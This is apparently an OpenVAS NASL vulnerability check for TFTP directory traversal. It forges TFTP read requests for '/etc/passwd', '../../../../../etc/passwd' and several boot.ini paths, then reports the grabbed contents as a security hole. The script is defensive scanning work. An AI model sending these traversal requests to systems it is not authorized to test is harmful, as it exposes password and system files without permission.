# OpenVAS Vulnerability Test
# $Id: tftpd_dir_trav.nasl 50 2013-11-07 18:27:30Z jan $
# Description: TFTP directory traversal
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The TFTP (Trivial File Transfer Protocol) allows
remote users to read files without having to log in.
This may be a big security flaw, especially if tftpd
(the TFTP server) is not well configured by the
admin of the remote host.";

tag_solution = "disable the tftp daemon, or if you really need it
run it in a chrooted environment";

# This script replaces the old C plugin "tftp_grab_file".

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
if(description)
{
 script_id(18262);
 script_version("$Revision: 50 $");
 script_tag(name:"last_modification", value:"$Date: 2013-11-07 19:27:30 +0100 (Do, 07. Nov 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");
 script_cve_id("CVE-1999-0498", "CVE-1999-0183");
 script_bugtraq_id(6198, 11584, 11582);

 script_name( "TFTP directory traversal");
 
 script_description( desc);
 
 script_summary( "Attempts to grab a file through TFTP");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2005 Michel Arboi");
 script_family( "Remote file access");
 script_dependencies('tftpd_detect.nasl');
 script_require_keys("Services/udp/tftp");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include('global_settings.inc');
include('dump.inc');

if(islocalhost()) exit(0);	# ?
if(TARGET_IS_IPV6())exit(0);

function tftp_grab(port, file)
{
 local_var	req, rep, sport, ip, u, filter, data, i;

 req = '\x00\x01'+file+'\0netascii\0';
 sport = rand() % 64512 + 1024;

 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0, 
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());
		     
 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 2; i ++)	# Try twice
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && data[1] == '\x03')
   {
     local_var	c;
     c = substr(data, 4);
     # debug_print('Content of ',file, "= ", c, '\n');
     set_kb_item(name: 'tftp/'+port+'/filename/'+ nb, value: file);
     set_kb_item(name: 'tftp/'+port+'/filecontent/'+ nb, value: c);
     nb ++;
     return c;
   }
   else
     return NULL;
  }
 }
 return NULL;
}

# function report_backdoor was moved to tftpd_backdoor.nasl

function report_and_exit(file, content, port)
{
 set_kb_item(name: 'tftp/'+port+'/get_file', value: file);
 # Avoid a double report with the old C plugin
 if (get_kb_item('tftp/get_file')) exit(0);
 if (report_verbosity < 1)
  report = desc;
 else
  report = str_replace(string: desc, find: '\nSolution', replace: 
'It was possible to retrieve the file ' + file + '
through tftp. Here is what we could grab : \n' + f + '\n\nSolution');
  security_hole(port: port, proto: "udp", data: report);
 exit(0);
}

# 

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
nb = 0;

foreach file (make_list('/etc/passwd', '../../../../../etc/passwd'))
{
 f = tftp_grab(port: port, file: file);
 if (f)
 {
  debug_print('Content of ', file, ': ', f, '\n');
# if (substr(f, 0, 1) == 'MZ')
#  report_backdoor(port: port);
  if (report_paranoia > 1 || egrep(string: f, pattern: "^.*:.*:.*:.*:"))
   report_and_exit(file: file, content: f, port: port);
 }
}

foreach file (make_list('/boot.ini', '../../../boot.ini', "C:\\boot.ini", 'boot.ini'))
{
 f = tftp_grab(port: port, file: file);
 if (f)
 {
  debug_print('Content of ', f, ': ', file, '\n');
# if (substr(f, 0, 1) == 'MZ')
#  report_backdoor(port: port, file: file);
  if (report_paranoia > 1 ||
       ("ECHO" >< f)          || ("SET " >< f)             ||
       ("export" >< f)        || ("EXPORT" >< f)           ||
       ("mode" >< f)          || ("MODE" >< f)             || 
       ("doskey" >< f)        || ("DOSKEY" >< f)           ||
       ("[boot loader]" >< f) || ("[fonts]" >< f)          ||
       ("[extensions]" >< f)  || ("[mci extensions]" >< f) ||
       ("[files]" >< f)       || ("[Mail]" >< f)           ||
       ("[operating systems]" >< f)              )
  {
   report_and_exit(file: file, content: f, port: port);
  }
 }
}

